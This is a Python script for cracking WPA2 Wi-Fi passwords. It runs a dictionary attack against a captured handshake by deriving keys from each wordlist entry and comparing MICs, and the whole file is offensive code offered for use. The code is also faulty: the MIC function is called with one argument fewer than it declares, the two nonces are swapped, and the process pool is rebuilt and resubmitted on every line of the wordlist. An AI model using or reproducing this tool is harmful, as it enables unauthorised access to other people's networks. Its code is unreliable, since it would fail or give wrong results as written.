import hashlib
import hmac
import os
from concurrent.futures import ProcessPoolExecutor, as_completed

def calculate_wpa2_mic(password, ssid, ap_mac, client_mac, ap_nonce, client_nonce, eace, eapol_data):
    ssid_bytes = ssid.encode('utf-8')
    password_bytes = password.encode('utf-8')
    pmk = hashlib.pbkdf2_hmac('sha1', password_bytes, ssid_bytes, 4096, 32)
    min_mac, max_mac = min(ap_mac, client_mac), max(ap_mac, client_mac)
    min_nonce, max_nonce = min(ap_nonce, client_nonce), max(ap_nonce, client_nonce)
    b_data = b"Pairwise key expansion\x00" + min_mac + max_mac + min_nonce + max_nonce
    kck = hmac.new(pmk, b_data + b"\x00", hashlib.sha1).digest()[:16]
    calculated_mic = hmac.new(kck, eapol_data, hashlib.sha1).digest()[:16]
    return password, calculated_mic

def main():
    name_of_wifi = input("write wifi name")
    wordlist_path = input("wordlist file path location")

    router_mac = input("enter router mac").replace(":", "").lower()
    client_mac = input("enter target mac").replace(":", "").lower()
    anonce = input("enter aonce")
    nonce = input("enter nnonce")
    raw_packet = input("enter packet")

    ap_mac_bytes = bytes.fromhex(router_mac)
    client_mac_bytes = bytes.fromhex(client_mac)
    ap_nonce_bytes = bytes.fromhex(nonce)
    client_nonce_bytes = bytes.fromhex(anonce)
    captured_mic = bytes.fromhex(raw_packet[162:194])
    packet_with_zero_mic = raw_packet[:162] + ("0" * 32) + raw_packet[194:]
    eapol_packet_data = bytes.fromhex(packet_with_zero_mic)
    if not os.path.exists(wordlist_path):
        print(f"Couldnt find: '{wordlist_path}'.")
        return

    print(f"starting attack using: {wordlist_path}...")

    print(f"brute forcing password with: {wordlist_path}...")

    passwords = []
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as file:
        for line in file:
            p = line.strip()
            if p:
                passwords.append(p)
                password_found = False

                with ProcessPoolExecutor() as executor:#מליץ כמו thread אבל לא בידיוק
                    futures = [
                        executor.submit(
                            calculate_wpa2_mic, pwd, name_of_wifi, ap_mac_bytes,
                            client_mac_bytes, ap_nonce_bytes, client_nonce_bytes, eapol_packet_data
                        )
                        for pwd in passwords
                    ]

                    for future in as_completed(futures):
                        pwd_tested, result_mic = future.result()
                        if result_mic == captured_mic:
                            print(f"\nPassword found: {pwd_tested}")
                            password_found = True
                            executor.shutdown(wait=False, cancel_futures=True)
                            break
    if not password_found:
        print("\nPassword not found in the wordlist.")

if __name__ == '__main__':
    main()
